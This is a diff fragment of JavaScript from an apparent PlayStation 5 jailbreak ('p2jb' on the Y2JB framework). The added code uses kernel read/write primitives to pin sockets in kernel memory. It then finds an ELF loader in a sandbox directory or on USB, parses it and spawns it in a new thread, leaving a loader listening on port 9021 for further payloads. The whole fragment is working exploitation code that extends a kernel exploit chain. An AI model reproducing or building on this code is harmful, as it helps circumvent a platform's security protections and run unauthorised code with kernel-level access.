+            write32(rwpair + 0x4n, BigInt(ipv6_kernel_rw.data.victim_sock));
+
+            const payloadout = malloc(4);
+
+            write64(args + 0x00n, syscall_wrapper - 0x7n);
+            write64(args + 0x08n, rwpipe);
+            write64(args + 0x10n, rwpair);
+            write64(args + 0x18n, ipv6_kernel_rw.data.pipe_addr);
+            write64(args + 0x20n, kernel.addr.data_base);
+            write64(args + 0x28n, payloadout);
+
+            await log("spawning " + filepath);
+            const ret = call(Thrd_create, thr_handle_addr, elf_entry_point, args);
+            if (ret !== 0n) throw new Error("Thrd_create() error: " + toHex(ret));
+            return { thr_handle: read64(thr_handle_addr), payloadout };
+        }
+
+        function get_y2jb_version() {
+            if (typeof version_string !== "string") return null;
+            const m = version_string.match(/Y2JB\s+(\d+)\.(\d+)/);
+            return m ? { major: +m[1], minor: +m[2], str: version_string } : null;
+        }
+        function y2jb_ge15(v) {
+            return v !== null && (v.major > 1 || (v.major === 1 && v.minor >= 5));
+        }
+
+        function resolve_title_id() {
+            if (typeof TITLE_ID === "string" && TITLE_ID.length > 0) return TITLE_ID;
+            if (typeof get_title_id === "function") {
+                try {
+                    const t = get_title_id();
+                    if (typeof t === "string" && t.length > 0) return t;
+                } catch (_) { }
+            }
+            return null;
+        }
+
+        async function stage_load_elf_via_sandbox(S) {
+            await ulog("stage_elfldr: entered (sandbox-slot elf_run handoff)");
+            if (!S.data_base_ok) {
+                await ulog("stage_elfldr: kernel data_base not resolved - skipped");
+                send_notification("Stage 7\nelf loader skipped (no data_base)");
+                return;
+            }
+            try {
+
+                const is_y2jb_14 = (typeof TITLE_ID === "string" && TITLE_ID.length > 0);
+                let elf_path = null, elf_source = null;
+                if (is_y2jb_14) {
+                    const ELFLDR_NAMES_SBX = ["elfldr_1320_v5.elf"];
+                    const SANDBOX_BASE = "/download0/cache/splash_screen/" +
+                        "aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY=/";
+                    const title_id = resolve_title_id();
+                    outer:
+                    for (const slot of ["000", "001", "002"]) {
+                        for (const name of ELFLDR_NAMES_SBX) {
+                            const p = "/mnt/sandbox/" + title_id + "_" + slot +
+                                SANDBOX_BASE + name;
+                            if (file_exists(p)) {
+                                elf_path = p; elf_source = "sandbox"; break outer;
+                            }
+                        }
+                    }
+                    if (!elf_path) {
+                        await ulog("stage_elfldr: elfldr_1320_v5.elf not in any " +
+                            "Y2JB 1.4 sandbox slot - skipped");
+                        send_notification("Stage 7\nelfldr not in sandbox\n" +
+                            "(jailbreak still complete)");
+                        return;
+                    }
+                } else {
+                    const ELFLDR_NAMES_USB = ["elfldr_1320_v5.elf",
+                        "elfldr_1320.elf", "elfldr.elf"];
+                    for (let u = 0; u < 8 && !elf_path; u++) {
+                        for (const name of ELFLDR_NAMES_USB) {
+                            const p = "/mnt/usb" + u + "/" + name;
+                            if (file_exists(p)) {
+                                elf_path = p; elf_source = "usb"; break;
+                            }
+                        }
+                    }
+                    if (!elf_path) {
+                        await ulog("stage_elfldr: elfldr not found on /mnt/usb0..7 " +
+                            "(Y2JB 1.3 requires USB delivery) - skipped");
+                        send_notification("Stage 7\nelfldr not on USB\n" +
+                            "(put elfldr_1320.elf on USB and retry)");
+                        return;
+                    }
+                }
+                await ulog("stage_elfldr: found (" + elf_source + ") " + elf_path);
+
+                ipv6_kernel_rw.init(S.fd_ofiles, S.kread64, S.kwrite64);
+                kernel.addr.data_base = S.data_base;
+                await ulog("stage_elfldr: ipv6_kernel_rw built (master_sock=" +
+                    ipv6_kernel_rw.data.master_sock + " victim_sock=" +
+                    ipv6_kernel_rw.data.victim_sock + ")");
+
+                const pin_sock = (fd) => {
+                    const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
+                    if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
+                    const so = S.kread64(fp);
+                    if (so === 0n || (so >> 48n) !== 0xFFFFn) return;
+                    S.kwrite32(so, 0x100);
+                };
+                pin_sock(ipv6_kernel_rw.data.master_sock);
+                pin_sock(ipv6_kernel_rw.data.victim_sock);
+
+                const elf_data = read_file(elf_path);
+                await ulog("stage_elfldr: read " + elf_data.length +
+                    " bytes; parsing...");
+                const entry = await elf_parse(elf_data);
+                await ulog("stage_elfldr: elf entry=" + toHex(entry) +
+                    "; spawning elfldr...");
+                await elf_run(entry, elf_path);
+
+                await ulog("stage_elfldr: elfldr launched - listening on :9021");
+                send_notification("Stage 7\nelfldr running - send your ELF to\n" +
+                    "<ps5-ip>:9021");
+            } catch (e) {
+                await ulog("stage_elfldr: failed: " + e.message +
+                    " (jailbreak unaffected)");
+                send_notification("Stage 7\nelfldr failed: " + e.message +
+                    "\n(jailbreak still complete)");
+            }
+        }
+
+        async function stage_load_elf_via_kexp(S) {
+            await ulog("stage_elfldr: entered (kexp / load_aioshellcode handoff)");
             if (!S.data_base_ok) {
                 await ulog("stage_elfldr: kernel data_base not resolved - skipped");
                 send_notification("Stage 7\nelf loader skipped (no data_base)");
@@ -1539,9 +2254,9 @@ async function start_p2jb() {
             try {
                 if (typeof load_aioshellcode !== "function") {
                     await ulog("stage_elfldr: load_aioshellcode not in scope - " +
-                        "the PS5 must be running Y2JB >= 1.4");
-                    send_notification("Stage 7\nUpdate the PS5 to Y2JB 1.4\n" +
-                        "(elf loader skipped)");
+                        "kexp delivery unavailable");
+                    send_notification("Stage 7\nload_aioshellcode missing\n" +
+                        "(jailbreak still complete)");
                     return;
                 }
 
@@ -1558,7 +2273,7 @@ async function start_p2jb() {
                 await ulog("stage_elfldr: load_aioshellcode returned - " +
                     "elfldr should now be listening on :9021");
                 send_notification("Stage 7\nelfldr running - send your ELF to\n" +
-                    "<ps5-ip>:9021  (e.g. BD-UN-JB unpatcher)");
+                    "<ps5-ip>:9021");
             } catch (e) {
                 await ulog("stage_elfldr: kexp handoff failed: " + e.message +
                     " (jailbreak unaffected)");
@@ -1570,9 +2285,17 @@ async function start_p2jb() {
         send_notification(p2jb_version + "\nport by matem6");
 
         {
-            if (typeof load_aioshellcode !== "function") {
-                await ulog("FATAL: Y2JB >= 1.4 required");
-                send_notification("p2jb requires Y2JB 1.4 or newer\n" +
+
+            const has_title_id = (typeof TITLE_ID === "string" && TITLE_ID.length > 0)
+                || (typeof get_title_id === "function");
+            if (typeof ipv6_kernel_rw === "undefined" ||
+                !has_title_id ||
+                typeof file_exists !== "function" ||
+                typeof read_file !== "function") {
+                await ulog("FATAL: Y2JB framework helpers missing " +
+                    "(ipv6_kernel_rw / TITLE_ID|get_title_id / " +
+                    "file_exists / read_file)");
+                send_notification("p2jb: Y2JB framework helpers missing\n" +
                     "(update y2jb and retry)");
                 return false;
             }
@@ -1664,7 +2387,16 @@ async function start_p2jb() {
 
         await stage6(S);
         await stage7(S);
-        await stage_load_elf(S);
+        await stage_debug_menu(S);
+
+        const yver = get_y2jb_version();
+        await ulog("stage_elfldr: detected " +
+            (yver ? yver.str : "Y2JB <unknown version_string>"));
+        if (y2jb_ge15(yver) || typeof load_aioshellcode === "function") {
+            await stage_load_elf_via_kexp(S);
+        } else {
+            await stage_load_elf_via_sandbox(S);
+        }
 
         try {
             const B = S.proc_ucred;
